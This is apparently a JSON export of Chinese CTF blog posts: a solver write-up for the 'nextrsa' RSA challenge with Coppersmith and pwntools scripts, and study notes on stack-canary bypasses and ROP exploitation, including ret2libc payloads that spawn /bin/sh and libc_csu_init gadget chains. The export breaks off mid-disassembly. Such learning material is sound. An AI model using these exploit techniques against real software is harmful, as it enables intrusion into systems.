{"posts": [{"title": "\u7b2c\u4e8c\u5c4a\u5f3a\u7f51\u676fnextrsa", "date": "2018-03-30T13:57:11-00.00", "path": "/archives/nextrsa/", "text": "nextrsa\n\n\u7b2c\u4e00\u5173\n\u7b2c\u4e00\u5173\n\u56e0\u4e3an\u7684\u4f4d\u6570\u8f83\u4f4e\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u7528factor.db\u5206\u89e3\n\n\u7b2c\u4e8c\u5173\n\u7b2c\u4e8c\u5173\n\u53ef\u4ee5\u53d1\u73b0e\u548cn\u76f8\u5dee\u65e0\u51e0\uff0c\u5219d\u5c31\u5e94\u5f53\u5f88\u5c0f\uff0c\u9002\u5408Wiener's Attack\u653b\u51fb\n\n\u7b2c\u4e09\u5173\n\u7b2c\u4e09\u5173\nCoppersmith\u6709\u4e00\u4e2a\u76f8\u5173\u5df2\u77e5\u660e\u6587\u9ad8\u4f4d\u7684\u5957\u8def\uff0c\u6839\u636e\u5176\u5957\u8def\u53ef\u4ee5\u5199\u811a\u672c\u8dd1\u51fax:\nfrom sage.all import *\nimport binascii\n\ndef coppersmith_howgrave_univariate(pol, modulus, beta, mm, tt, XX):\n    &quot;&quot;&quot;\n    Coppersmith revisited by Howgrave-Graham\n\n    finds a solution if:\n    * b|modulus, b &gt;= modulus^beta , 0 &lt; beta &lt;= 1\n    * |x| &lt; XX\n    &quot;&quot;&quot;\n    #\n    # init\n    #\n    dd = pol.degree()\n    nn = dd * mm + tt\n\n    #\n    # checks\n    #\n    if not 0 &lt; beta &lt;= 1:\n        raise ValueError(&quot;beta should belongs in (0, 1]&quot;)\n\n    if not pol.is_monic():\n        raise ArithmeticError(&quot;Polynomial must be monic.&quot;)\n\n    #\n    # calculate bounds and display them\n    #\n    &quot;&quot;&quot;\n    * we want to find g(x) such that ||g(xX)|| &lt;= b^m / sqrt(n)\n    * we know LLL will give us a short vector v such that:\n    ||v|| &lt;= 2^((n - 1)/4) * det(L)^(1/n)\n    * we will use that vector as a coefficient vector for our g(x)\n\n    * so we want to satisfy:\n    2^((n - 1)/4) * det(L)^(1/n) &lt; N^(beta*m) / sqrt(n)\n\n    so we can obtain ||v|| &lt; N^(beta*m) / sqrt(n) &lt;= b^m / sqrt(n)\n    (it&#39;s important to use N because we might not know b)\n    &quot;&quot;&quot;\n\n\n    #\n    # Coppersmith revisited algo for univariate\n    #\n\n    # change ring of pol and x\n    polZ = pol.change_ring(ZZ)\n    x = polZ.parent().gen()\n\n    # compute polynomials\n    gg = []\n    for ii in range(mm):\n        for jj in range(dd):\n            gg.append((x * XX)**jj * modulus**(mm - ii) * polZ(x * XX)**ii)\n    for ii in range(tt):\n        gg.append((x * XX)**ii * polZ(x * XX)**mm)\n\n    # construct lattice B\n    BB = Matrix(ZZ, nn)\n\n    for ii in range(nn):\n        for jj in range(ii+1):\n            BB[ii, jj] = gg[ii][jj]\n\n\n    # LLL\n    BB = BB.LLL()\n\n    # transform shortest vector in polynomial    \n    new_pol = 0\n    for ii in range(nn):\n        new_pol += x**ii * BB[0, ii] / XX**ii\n\n    # factor polynomial\n    potential_roots = new_pol.roots()\n    print &quot;potential roots:&quot;, potential_roots\n\n    # test roots\n    roots = []\n    for root in potential_roots:\n        if root[0].is_integer():\n            result = polZ(ZZ(root[0]))\n            if gcd(modulus, result) &gt;= modulus^beta:\n                roots.append(ZZ(root[0]))\n\n    # \n    return roots\n\nlength_N = 512\nKbits = 64\nN = 85386486679828599580613066311269711214589585481101615581296927592958807231446970184482261388474676486050444822516280749509523758510668655773404480913269316295175308996609608070541200210554579418533451998222898737697148663794221042817919855879902993658181608937735268591691305164506461133402548866059191941933L\ne = 3\nC = 39405977400432024095329579138777905592731613749623714143014800208080426514337386767953501370330051575213583063517497523787104967672473851683888736374797826583547420259646720505700192827892104650587073833929922367521346003590720815367916103365434959190063774892078125987148203790224964513136099494214652877100L\nb = 0xfedcba98765432100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n\nP.&lt;x&gt; = PolynomialRing(Zmod(N))\n\nf = (b + x)^e - C\ndd = f.degree()\nbeta = 1\nepsilon = beta / 7\nmm = ceil(beta**2 / (dd * epsilon))\ntt = floor(dd * mm * ((1/beta) - 1))\nXX = ceil(N**((beta**2/dd) - epsilon))\nroots = coppersmith_howgrave_univariate(f, N, beta, mm, tt, XX)\nprint &quot;\\n# Solutions&quot;\nprint &quot;we found:&quot;, str(roots)\n\n\n\u7b2c\u56db\u5173\n\u7b2c\u56db\u5173\n\u7b2c\u56db\u5173\n\n\u7b2c\u4e94\u5173\n\u7b2c\u4e94\u5173\n\u628an\u5c1d\u8bd5\u5206\u89e3\u53ef\u77e5n\u542b\u6709\u4e00\u4e2a\u5c0f\u56e0\u6570\uff0c\u4f46\u662f\u8fd9\u4e2an\u662f\u9694\u4e00\u6bb5\u65f6\u95f4\uff08\u4e0d\u662f\u6bcf\u4e00\u6b21\uff09\u4f1a\u53d8\u7684\uff0c\u4e0d\u8fc7\u542b\u5c0f\u56e0\u6570\u7684\u6027\u8d28\u4e0d\u53d8\uff0c\u6240\u4ee5\u6bcf\u6b21\u5230\u8fd9\u91cc\u5148\u5206\u89e3\u5427\n\n\u7b2c\u516d\u5173\n\u7b2c\u516d\u5173\n\u53ef\u4ee5\u76f4\u63a5\u770b\u5230e=0x3\u5f88\u5c0f\uff0c\u4f30\u8ba1\u5c31\u662f\u7206\u7834c+i*n\u4e2d\u7684i\u4f7f\u5176\u80fd\u88abe\u5f00\u6839\uff0c\u4e8b\u5b9e\u8bc1\u660e\u786e\u5b9e\u5927\u6982\u51e0\u4e07\u5c31\u51fa\u6765\u4e86\n\n\u7b2c\u4e03\u5173\n\u7b2c\u4e03\u5173\n\u5149\u770b\u4e0a\u53bb\u662f\u6ca1\u4ec0\u4e48\u601d\u8def\uff0c\u4f46\u6c42gcd(n1,n2)\u4e0d\u7b49\u4e8e1\uff0c\u5219\u53ef\u76f4\u63a5\u5206\u89e3\u8fd9\u4e24\u4e2an\n\n\u7b2c\u516b\u5173\n\u7b2c\u516b\u5173\n\u633a\u660e\u663e\u7684\u5171\u6a21\u653b\u51fb\n\n\u7b2c\u4e5d\u5173\n\u7b2c\u4e5d\u5173\n\u4e5f\u662f\u5f88\u660e\u663e\u7684\u5e7f\u64ad\u653b\u51fb\uff0ce\u5f88\u5c0f\u4e14\u660e\u6587\u76f8\u540c\uff0c\u8bdd\u8bf4\u8d8a\u5230\u540e\u9762\u8d8a\u7b80\u5355\u4e48\n\n\u811a\u672c\n# -*- coding: utf-8 -*-\n\nfrom pwn import *\nfrom mylib import *\nimport hashlib\nimport gmpy\n\n#context.log_level = &quot;debug&quot;\n\ndef before():\n    token = &quot;icq850a27bc1dc210c9e10cc8d1ed28f&quot;\n    r = remote(&#39;39.107.33.90&#39;,9999)\n    r.sendline(token)\n    r.recvuntil(&#39;\\&#39;&#39;)\n    value = r.recv(8)\n    r.recvuntil(&#39;=&#39;)\n    for a in xrange(0xff):\n            for b in xrange(0xff):\n                    for c in xrange(0x1f):\n                            hashv = chr(a) + chr(b) + chr(c)\n                            if(hashlib.sha256(hashv).hexdigest()[0:8] == value):\n                                    r.sendline(hashv.encode(&#39;hex&#39;))\n                                    return r\n\ndef solve(r):\n    &quot;&quot;&quot;\n    \u4f4d\u6570\u5c11,\u53ef\u76f4\u63a5\u5206\u89e3\n    &quot;&quot;&quot;\n    r.recvuntil(&#39;c=&#39;)\n    c = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recv(10000)\n    e = 0x10001\n    p = 289540461376837531747468286266019261659\n    q = 306774653454153140532319815768090345109\n    n = p * q\n    ph = (p - 1) * (q - 1)\n    d = gmpy.invert(e, ph)\n    m = QuickPower(c, d, n)\n    r.sendline(hex(m).replace(&quot;L&quot;,&quot;&quot;))\n    &quot;&quot;&quot;\n    Wiener&#39;s Attack\n    &quot;&quot;&quot;\n    r.recvuntil(&#39;n=&#39;)\n    n = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recvuntil(&#39;e=&#39;)\n    e = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recvuntil(&#39;c=&#39;)\n    c = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recv(10000)\n    d = hack_RSA(e,n)\n    m = QuickPower(c, d, n)\n    r.sendline(hex(m).replace(&quot;L&quot;,&quot;&quot;))\n    &quot;&quot;&quot;\n    Coppersmith\n    &quot;&quot;&quot;\n    r.recvuntil(&#39;m&#39;)    #10000 wrong\n    x = 3704324190009897835\n    r.sendline(hex(x).replace(&quot;L&quot;,&quot;&quot;))\n    &quot;&quot;&quot;\n    nextprime()\u6027\u8d28\u6784\u9020\u4e00\u5143\u4e8c\u6b21\u65b9\u7a0b\u6c42\u6839\n    &quot;&quot;&quot;\n    r.recvuntil(&#39;c=&#39;)\n    c = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recv(10000)\n    e = 0x10001\n    q = 114791494681514143990268371423282183138226784645868909558224024738011633713833580549522009721245299751435183564384247261418984397745114977301564583085777881485180217075670585703780063072373569054286277474670485124459902688373648390826470893613150198411843162021692225644621249349903453125961550887837378298881\n    p = 132940802289018336261987415312533953042764596984032548157327529495089307889127354914528507277209940457450746338751400025568015673025956762534143027257695791611900765053802453566263676389771478041671317414828940200119172760057249923066534954345956113954028278683477795444749575874548525999126508093286460575953\n    n = q * p\n    ph = (p - 1) * (q - 1)\n    d = gmpy.invert(e, ph)\n    m = QuickPower(c, d, n)\n    r.sendline(hex(m).replace(&quot;L&quot;,&quot;&quot;))\n    &quot;&quot;&quot;\n    n\u542b\u6709\u5c0f\u56e0\u6570,\u8fc7\u6bb5\u65f6\u95f4\u4f1a\u6539\u53d8n\n    &quot;&quot;&quot;\n    r.recvuntil(&#39;c=&#39;)\n    c = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recv(10000)\n    e = 0x10001\n    q = 1827078707\n    p = 120393827811847730665892922601047874074897457839754965824187553709286586875999984122668238470178081377988439748992735957987417809407665405412580451688753139556272709693049760814986485709769800614157806922562929660004878835280427602632657375319022388348710785821982994403660254841027504457789884082670526620753\n    n = p * q\n    ph = (p - 1) * (q - 1)\n    d = gmpy.invert(e, ph)\n    m = QuickPower(c, d, n)\n    r.sendline(hex(m).replace(&quot;L&quot;,&quot;&quot;))\n    &quot;&quot;&quot;\n    e\u4e3a\u5c0f\u6307\u6570\n    &quot;&quot;&quot;\n    r.recvuntil(&#39;n=&#39;)\n    n = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recvuntil(&#39;c=&#39;)\n    c = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recv(10000)\n    e = 0x3\n    for i in xrange(1000000):\n        mm = gmpy.root(c+i*n, e)\n        if(mm[1] == 1):\n        r.sendline(hex(mm[0]).replace(&quot;L&quot;,&quot;&quot;))\n        break\n    &quot;&quot;&quot;\n    \u4e24\u4e2an\u4e0d\u4e92\u7d20\n    &quot;&quot;&quot;\n    r.recvuntil(&#39;n1=&#39;)\n    n1 = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recvuntil(&#39;c1=&#39;)\n    c1 = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recvuntil(&#39;n2=&#39;)\n    n2 = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recvuntil(&#39;c2=&#39;)\n    c2 = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recv(10000)\n    e1 = e2 = 0x10001\n    p1 = gmpy.gcd(n1,n2)\n    q1 = n1 / p1\n    ph1 = (p1 - 1) * (q1 - 1)\n    d1 = gmpy.invert(e1, ph1)\n    m1 = QuickPower(c1, d1, n1)\n    r.sendline(hex(m1).replace(&quot;L&quot;,&quot;&quot;))\n    r.recv(10000)\n    q2 = n2 / p1\n    ph2 = (p1 - 1) * (q2 - 1)\n    d2 = gmpy.invert(e2, ph2)\n    m = QuickPower(c2, d2, n2)\n    r.sendline(hex(m).replace(&quot;L&quot;,&quot;&quot;))\n    &quot;&quot;&quot;\n    \u5171\u6a21\n    &quot;&quot;&quot;\n    r.recvuntil(&#39;n=&#39;)\n    n = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recvuntil(&#39;e1=&#39;)\n    e1 = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recvuntil(&#39;c1=&#39;)\n    c1 = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recvuntil(&#39;e2=&#39;)\n    e2 = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recvuntil(&#39;c2=&#39;)\n    c2 = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recv(10000)\n    gcd,s,t = gmpy.gcdext(e1,e2)\n    if s &lt; 0:\n        s = -s\n        c1 = gmpy.invert(c1, n)\n    if t &lt; 0:\n        t = -t\n        c2 = gmpy.invert(c2, n)\n    m = (QuickPower(c1, s, n) * QuickPower(c2, t, n)) % n\n    r.sendline(hex(m).replace(&quot;L&quot;,&quot;&quot;))\n    &quot;&quot;&quot;\n    \u5e7f\u64ad\u653b\u51fb\n    &quot;&quot;&quot;\n    r.recvuntil(&#39;e=&#39;)\n    e = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recvuntil(&#39;n1=&#39;)\n    n1 = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recvuntil(&#39;c1=&#39;)\n    c1 = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recvuntil(&#39;n2=&#39;)\n    n2 = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recvuntil(&#39;c2=&#39;)\n    c2 = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recvuntil(&#39;n3=&#39;)\n    n3 = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recvuntil(&#39;c3=&#39;)\n    c3 = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recv(10000)\n    m = chinese_remainder_theorem([(c1,n1),(c2,n2),(c3,n3)])\n    r.sendline(hex(gmpy.root(m, e)[0]).replace(&quot;L&quot;,&quot;&quot;))\n    print r.recvuntil(&quot;}&quot;)\n\nif __name__ == &quot;__main__&quot;:\n    r = before()\n    solve(r)\n\n\nflag\nflag\n", "categories": [{"name": "crypto", "slug": "crypto", "permalink": "/category/crypto/"}], "tags": [{"name": "crypto", "slug": "crypto", "permalink": "/tag/crypto/"}, {"name": "rsa", "slug": "rsa", "permalink": "/tag/rsa/"}]}, {"title": "canary\u7b14\u8bb0", "date": "2018-03-30T13:57:11-00.00", "path": "/archives/CanaryNote/", "text": "canary\u7b14\u8bb0\n\u5e03\u5c40\ncanary\u5e03\u5c40\nmore\n\u76f4\u63a5\u6cc4\u6f0f\n\u56e0\u4e3acanary\u6700\u4f4e\u5b57\u8282\u5fc5\u662f'\\x00'(\u9632\u6b62\u586b\u6ee1\u628a\u5b83\u6253\u5370\u51fa\u6765)\uff0c\u5219\u6ee1\u8db3\u4e0b\u9762\u6761\u4ef6\uff1a\n\n\n\u7f13\u51b2\u533a\u6ea2\u51fa\u53ef\u4ee5\u586b\u5145\u5230\u4e14\u53ea\u586b\u5145\u5230canary\u6700\u4f4e\u5b57\u8282\n\u7a0b\u5e8f\u53ef\u4ee5\u8f93\u51fa\u586b\u5145\u7684\u5185\u5bb9\n\u51fd\u6570\u8fd4\u56de\u524d\u8fd8\u6709\u518d\u6b21\u586b\u5145\u673a\u4f1a\n\n\n\u586b\u5145\u5230canary\u6700\u4f4e\u5b57\u8282\n\u8fd9\u6837\u5c31\u53ef\u4ee5\u8bfb\u51facanary\u540e\u518d\u628a\u5b83\u52a0\u5230payload\u4e0a\uff0c\u4ece\u800c\u7ed5\u8fc7canary\u3002\n\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\n\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u80fd\u591f\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u8bfb\u5199\u7684\u7279\u6027\uff0c\u53ef\u4ee5\u8bfb\u51facanary\u6216\u4fee\u6539cannary\u6267\u884c___stack_chk_fail()\uff0c\u5177\u4f53\u7528\u6cd5\uff1a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7b14\u8bb0\u3002\n\u7206\u7834\n\u82e5\u7a0b\u5e8f\u6709fork()\u4f7f\u5b50\u7a0b\u5e8f\u5faa\u73af\u6267\u884c\uff0c\u53ef\u4ee5\u901a\u8fc7\u5b50\u7a0b\u5e8f\u6808\u4e0e\u4e3b\u7a0b\u5e8f\u4e00\u81f4\u6162\u6162\u7206\u7834\u3002\nssp leak\n\u56e0\u4e3a\u51fd\u6570\u8fd4\u56de\u524d\u4f1a\u68c0\u67e5canary\uff0c\u82e5\u4e0d\u901a\u8fc7\u4f1a\u8df3\u8f6c\u5230___stack_chk_fail()\uff1a\n___stack_chk_fail()\n\u56e0\u6b64\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539___stack_chk_fail()\u5730\u5740\u548c\u8986\u76d6canary\u6765\u52ab\u6301\u7a0b\u5e8f\u6d41\u7a0b\uff0c\u4f46\u8fd9\u91cc\u4e5f\u6709\u4e00\u79cd\u53ef\u4ee5\u5229\u7528\u7684\u4e1c\u897f\uff1a\n\u770b\u4e00\u4e0b\u6e90\u7801\uff1a\n__stack_chk_fail:\nvoid \n__attribute__ ((noreturn)) \n__stack_chk_fail (void) {   \n    __fortify_fail (&quot;stack smashing detected&quot;); \n}\n\nfortify_fail:\nvoid \n__attribute__ ((noreturn)) \n__fortify_fail (msg)\n   const char *msg; {\n      /* The loop is added only to keep gcc happy. */\n         while (1)\n              __libc_message (2, &quot;*** %s ***: %s terminated\\n&quot;, msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;) \n} \nlibc_hidden_def (__fortify_fail)\n\n__libc_message \u7684\u7b2c\u4e8c\u4e2a%s\u8f93\u51fa\u7684\u662fargv[0]\uff0cargv[0]\u662f\u6307\u5411\u7b2c\u4e00\u4e2a\u542f\u52a8\u53c2\u6570\u5b57\u7b26\u4e32\u7684\u6307\u9488,\u7531\u6b64\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u7f13\u51b2\u533a\u6ea2\u51fa\u8986\u76d6\u6389argv[0]\u6253\u5370\u6211\u4eec\u60f3\u8981\u7684\u5730\u5740\u4e0a\u7684\u503c\u3002\n", "categories": [{"name": "pwn", "slug": "pwn", "permalink": "/category/pwn/"}], "tags": [{"name": "pwn", "slug": "pwn", "permalink": "/tag/pwn/"}, {"name": "canary", "slug": "canary", "permalink": "/tag/canary/"}]}, {"title": "\u4e00\u6b65\u4e00\u6b65\u5b66ROP\u7b14\u8bb0", "date": "2018-03-28T14:45:00-00.00", "path": "/archives/RopNote/", "text": "\u4e00\u6b65\u4e00\u6b65\u5b66ROP\u7b14\u8bb0\n\n\u539f\u6587\u5730\u5740: \u4e00\u6b65\u4e00\u6b65\u5b66ROP\n\nx86\n\u65e0\u4fdd\u62a4\n\n\u5173\u6389canary:  -fno-stack-protector\n\u5173\u6389NX:  -z execstack\n\u5173\u6389PIE:  sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space\n\n\u7ed5\u8fc7NX\ngdb\u4e0b\u627esystem()\u548c&quot;/bin/sh\\x00&quot;\u7684\u5730\u5740:\n(gdb) print system\n$1 = {&lt;text variable, no debug info&gt;} 0xb7e5f460 &lt;system&gt;\n(gdb) print __libc_start_main\n$2 = {&lt;text variable, no debug info&gt;} 0xb7e393f0 &lt;__libc_start_main&gt;\n(gdb) find 0xb7e393f0, +2200000, &quot;/bin/sh&quot;\n0xb7f81ff8\n(gdb) x/s 0xb7f81ff8\n0xb7f81ff8:  &quot;/bin/sh&quot;\n\n\u7ed5\u8fc7NX\u548cPIE\n\n\u770bplt : objdump -d -j .plt level2\n\u770bgot : objdump -R level2\n\u67e5\u770b\u76ee\u6807\u7a0b\u5e8f\u8c03\u7528\u7684so\u5e93 : ldd level2\n\n\u7528pwntools:\nelf = ELF(&#39;level2&#39;)\nplt_write = elf.symbols[&#39;write&#39;]\ngot_write = elf.got[&#39;write&#39;]\n\nlibc = ELF(&#39;libc.so&#39;)\nsystem_addr = write_addr - (libc.symbols[&#39;write&#39;] - libc.symbols[&#39;system&#39;])\n\n\u65e0libc.so\n\u6b65\u9aa4:\n\n\u6cc4\u9732__libc_start_main\u5730\u5740\n\u83b7\u53d6libc\u7248\u672c\n\u83b7\u53d6system\u5730\u5740\u4e0e/bin/sh\u7684\u5730\u5740\n\u518d\u6b21\u6267\u884c\u6e90\u7a0b\u5e8f\n\u89e6\u53d1\u6808\u6ea2\u51fa\u6267\u884csystem(\u201c/bin/sh\u201d)\n\nDynELF\u7684\u4f7f\u7528:\ndef leak(address):\n    payload1 = &#39;a&#39;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)\n    p.send(payload1)\n    data = p.recv(4)\n    print &quot;%#x =&gt; %s&quot; % (address, (data or &#39;&#39;).encode(&#39;hex&#39;))\n    return data\n\nd = DynELF(leak, elf=ELF(&#39;./level2&#39;))\nsystem_addr = d.lookup(&#39;system&#39;, &#39;libc&#39;)\n\n\nx64\n\u4f20\u53c2\u533a\u522b\n\n\u524d\u516d\u4e2a\u53c2\u6570\u4fdd\u5b58\u987a\u5e8f : RDI, RSI, RDX, RCX, R8, R9\n\ngadgets\n\n\u627eROP:  ROPgadget --binary level4 --only &quot;pop|ret&quot;\n\u8fc7\u6ee4:  ROPgadget --binary libc.so.6 --only &quot;pop|ret&quot; | grep rdi\n\n\u901a\u7528gadgets part1\n__libc_csu_init()\u4e0b:\n.text:0000000000400840                 public __libc_csu_init\n.text:0000000000400840 __libc_csu_init proc near               ; DATA XREF: _start+16o\n.text:0000000000400840                 push    r15\n.text:0000000000400842                 mov     r15d, edi\n.text:0000000000400845                 push    r14\n.text:0000000000400847                 mov     r14, rsi\n.text:000000000040084A                 push    r13\n.text:000000000040084C                 mov     r13, rdx\n.text:000000000040084F                 push    r12\n.text:0000000000400851                 lea     r12, __frame_dummy_init_array_entry\n.text:0000000000400858                 push    rbp\n.text:0000000000400859                 lea     rbp, __do_global_dtors_aux_fini_array_entry\n.text:0000000000400860                 push    rbx\n.text:0000000000400861                 sub     rbp, r12\n.text:0000000000400864                 xor     ebx, ebx\n.text:0000000000400866                 sar     rbp, 3\n.text:000000000040086A                 sub     rsp, 8\n.text:000000000040086E                 call    _init_proc\n.text:0000000000400873                 test    rbp, rbp\n.text:0000000000400876                 jz      short loc_400896\n.text:0000000000400878                 nop     dword ptr [rax+rax+00000000h]\n.text:0000000000400880\n.text:0000000000400880 loc_400880:                             ; CODE XREF: __libc_csu_init+54j\n.text:0000000000400880                 mov     rdx, r13\n.text:0000000000400883                 mov     rsi, r14\n.text:0000000000400886                 mov     edi, r15d\n.text:0000000000400889                 call    qword ptr [r12+rbx*8]\n.text:000000000040088D                 add     rbx, 1\n.text:0000000000400891                 cmp     rbx, rbp\n.text:0000000000400894                 jnz     short loc_400880\n.text:0000000000400896\n.text:0000000000400896 loc_400896:                             ; CODE XREF: __libc_csu_init+36j\n.text:0000000000400896                 add     rsp, 8\n.text:000000000040089A                 pop     rbx\n.text:000000000040089B                 pop     rbp\n.text:000000000040089C                 pop     r12\n.text:000000000040089E                 pop     r13\n.text:00000000004008A0                 pop     r14\n.text:00000000004008A2                 pop     r15\n.text:00000000004008A4                 retn\n.text:00000000004008A4 __libc_csu_init endp\n\n\u56e0\u6b64\u82e5\u8981\u8c03\u7528write(1,got_write,8), \u5219\u53ef\u8fd9\u6837\u6784\u9020:\n# rbx\u5fc5\u987b\u4e3a0,\u56e0\u4e3acall qword ptr [r12+rbx*8]\n# rbp\u5fc5\u987b\u4e3a1,0x40088D~0x400894\u6709\u4e00\u4e2acmp,jnz\n# r12 = addr_got,\u56e0\u4e3acall qword ptr [r12+rb1x*8]\n# r13 = rdx = arg3\n# r14 = rsi = arg2\n# r15 = edi = arg1\n# retn\u7684padding\u9700\u89817*8=56byte\n\n# padding\npayload1 =  &quot;\\x00&quot;*136 \n# pop rbx\u5730\u5740_rbx=0_rbp=1_\u8c03\u7528\u51fd\u6570got_arg1_arg2_arg3\npayload1 += p64(0x40089A) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) \n# mov rdx,r13\u5730\u5740(\u6ce8\u610f\u770b\u539f\u59cb\u6c47\u7f16)\npayload1 += p64(0x400880) \n# padding(7*8=56byte)\npayload1 += &quot;\\x00&quot;*56\n# ret\npayload1 += p64(main)\n\n\u6b64\u5916\u8fd8\u6709\u4e00\u4e2ax64 gadgets, \u5c31\u662f:\n\npop rdi\nret\n\n\u7684gadgets. \u8fd9\u4e2agadgets\u662f\u7531opcode\u9519\u4f4d\u4ea7\u751f\u7684.\n\u5982\u4e0a\u7684\u4f8b\u5b50\u4e2d0x4008A2, 0x4008A4\u4e24\u5904\u7684\u5b57\u8282\u7801\u5982\u4e0b:\n\n0x41 0x5f 0xc3\n\n\u610f\u601d\u662fpop r15, ret, \u4f46\u662f\u6070\u597dpop rdi, ret\u7684opcode\u5982\u4e0b:\n\n0x5f 0xc3\n\n\u56e0\u6b64\u5982\u679c\u6211\u4eec\u6307\u54110x4008A3\u5c31\u53ef\u4ee5\u83b7\u5f97pop rdi, ret\u7684opcode, \u4ece\u800c\u5bf9\u4e8e\u5355\u53c2\u6570\u51fd\u6570\u53ef\u4ee5\u76f4\u63a5\u83b7\u5f97\u6267\u884c\n\u4e0e\u6b64\u7c7b\u4f3c\u7684, \u8fd8\u67090x4008A1\u5904\u7684 pop rsi, pop r15, ret\n\u90a3\u4e48\u8fd9\u4e2a\u6709\u4ec0\u4e48\u7528\u5462\uff1f\u6211\u4eec\u77e5\u9053x64\u4f20\u53c2\u987a\u5e8f\u662frdi, rsi, rdx, rcx.\n\u6240\u4ee5rsi\u662f\u7b2c\u4e8c\u4e2a\u53c2\u6570, \u6211\u4eec\u53ef\u4ee5\u5728rop\u4e2d\u914d\u5408pop rdi,ret\u6765\u4f7f\u7528pop rsi, pop r15,ret, \u8fd9\u6837\u5c31\u53ef\u4ee5\u8f7b\u677e\u7684\u8c03\u75282\u4e2a\u53c2\u6570\u7684\u51fd\u6570.\n\u7efc\u4e0a, \u5c31\u662fx64\u4e0b\u5229\u7528\u901a\u7528gadgets\u8c03\u7528\u4e00\u4e2a\u53c2\u6570, \u4e24\u4e2a\u53c2\u6570, \u4e09\u4e2a\u53c2\u6570\u51fd\u6570\u7684\u65b9\u6cd5.\n\u901a\u7528gadgets part2\n_dl_runtime_resolve()\u4e0b(\u5728\u5185\u5b58\u4e2d\u7684\u5730\u5740\u662f\u968f\u673a\u7684):\n0x7ffff7def200 &lt;_dl_runtime_resolve&gt;:       sub     rsp,0x38\n0x7ffff7def204 &lt;_dl_runtime_resolve+4&gt;:     mov     QWORD PTR [rsp],rax\n0x7ffff7def208 &lt;_dl_runtime_resolve+8&gt;:     mov     QWORD PTR [rsp+0x8],rcx\n0x7ffff7def20d &lt;_dl_runtime_resolve+13&gt;:    mov     QWORD PTR [rsp+0x10],rdx\n0x7ffff7def212 &lt;_dl_runtime_resolve+18&gt;:    mov     QWORD PTR [rsp+0x18],rsi\n0x7ffff7def217 &lt;_dl_runtime_resolve+23&gt;:    mov     QWORD PTR [rsp+0x20],rdi\n0x7ffff7def21c &lt;_dl_runtime_resolve+28&gt;:    mov     QWORD PTR [rsp+0x28],r8\n0x7ffff7def221 &lt;_dl_runtime_resolve+33&gt;:    mov     QWORD PTR [rsp+0x30],r9\n0x7ffff7def226 &lt;_dl_runtime_resolve+38&gt;:    mov     rsi,QWORD PTR [rsp+0x40]\n0x7ffff7def22b &lt;_dl_runtime_resolve+43&gt;:    mov     rdi,QWORD PTR [rsp+0x38]\n0x7ffff7def230 &lt;_dl_runtime_resolve+48&gt;:    call    0x7ffff7de8680 &lt;_dl_fixup&gt;\n0x7ffff7def235 &lt;_dl_runtime_resolve+53&gt;:    mov     r11,rax\n0x7ffff7def238 &lt;_dl_runtime_resolve+56&gt;:    mov     r9,QWORD PTR [rsp+0x30]\n0x7ffff7def23d &lt;_dl_runtime_resolve+61&gt;:    mov     r8,QWORD PTR [rsp+0x28]\n0x7ffff7def242 &lt;_dl_runtime_resolve+66&gt;:    mov     rdi,QWORD PTR [rsp+0x20]\n0x7ffff7def247 &lt;_dl_runtime_resolve+71&gt;:    mov     rsi,QWORD PTR [rsp+0x18]\n0x7ffff7def24c &lt;_dl_runtime_resolve+76&gt;:    mov     rdx,QWORD PTR [rsp+0x10]\n0x7ffff7def251 &lt;_dl_runtime_resolve+81&gt;:    mov     